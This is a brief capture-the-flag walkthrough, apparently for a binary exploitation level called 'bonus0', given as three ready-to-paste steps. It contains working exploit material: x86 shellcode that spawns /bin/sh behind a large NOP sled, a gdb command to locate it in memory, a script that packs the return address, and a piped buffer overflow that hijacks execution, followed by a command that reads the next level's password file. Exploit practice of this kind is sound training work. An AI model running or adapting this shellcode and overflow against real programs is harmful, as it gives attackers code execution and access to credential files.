# bonus0: ready-to-paste commands

Run these three, in order, in the same terminal, without a pause between step 2 and step 3.

**1. Export the sled + shellcode:**

```bash
export SHELLCODE=$(python -c 'print "\x90"*65536 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

**2. Find its address:**

```bash
gdb -q -batch -ex "b *main" -ex run -ex 'p (char *)getenv("SHELLCODE")' ./bonus0
```

Take the address printed, add `0x8000`, convert to little-endian bytes:

```bash
python -c 'addr = 0xbffefe72 + 0x8000; print "\\x%02x\\x%02x\\x%02x\\x%02x" % (addr&0xff,(addr>>8)&0xff,(addr>>16)&0xff,(addr>>24)&0xff)'
```

(replace `0xbffefe72` with what gdb printed for you)

**3. Run it, using the bytes from step 2:**

```bash
(python -c 'print "A"*20'; sleep 0.3; python -c 'print "A"*9 + "<TARGET_BYTES>" + "B"*7'; sleep 0.3; cat) | ./bonus0
```

Then, once you have a shell:

```bash
cat /home/user/bonus1/.pass
```

If it segfaults: your terminal's environment shifted the address, redo steps 2 and 3 back to back, don't reuse an address from a previous attempt or a different terminal.
